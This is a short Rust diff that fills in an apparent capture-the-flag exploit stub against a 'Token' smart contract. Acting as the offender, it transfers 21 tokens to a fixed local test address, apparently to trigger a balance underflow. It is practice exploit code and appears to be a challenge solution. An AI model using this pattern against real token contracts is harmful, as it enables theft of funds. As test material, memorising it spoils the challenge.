@@ -27,6 +27,18 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &ctf::Actor,
     ) -> eyre::Result<()> {
+        let contract = Token::new(target.address, offender.clone());
+
+        contract
+            .transfer(
+                "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
+                    .parse::<Address>()?,
+                21.into(),
+            )
+            .send()
+            .await?
+            .await?;
+
         Ok(())
     }
 }
